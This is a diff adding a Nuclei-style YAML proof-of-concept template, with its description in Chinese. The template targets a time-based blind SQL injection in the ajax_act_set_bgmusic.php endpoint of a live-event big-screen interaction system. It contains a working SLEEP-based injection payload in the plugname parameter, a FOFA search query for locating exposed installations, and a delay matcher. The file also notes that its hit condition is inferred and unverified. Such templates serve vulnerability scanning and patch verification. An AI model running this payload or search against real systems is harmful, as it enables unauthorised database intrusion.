@@ -1,0 +1,22 @@
+id: poc-cmn8lpqd4i4liwen
+info:
+  name: 金华迪加现场大屏互动系统 ajax_act_set_bgmusic 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cmn8lpqd4i4liwen
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cmn8lpqd4i4liwen
+    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+http:
+- raw:
+  - GET /wall/ajax_act_set_bgmusic.php?bgmusicstatus=1&plugname=%22XOR(if(now()=sysdate(),SLEEP(8),0))XOR%22Z HTTP/1.1
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
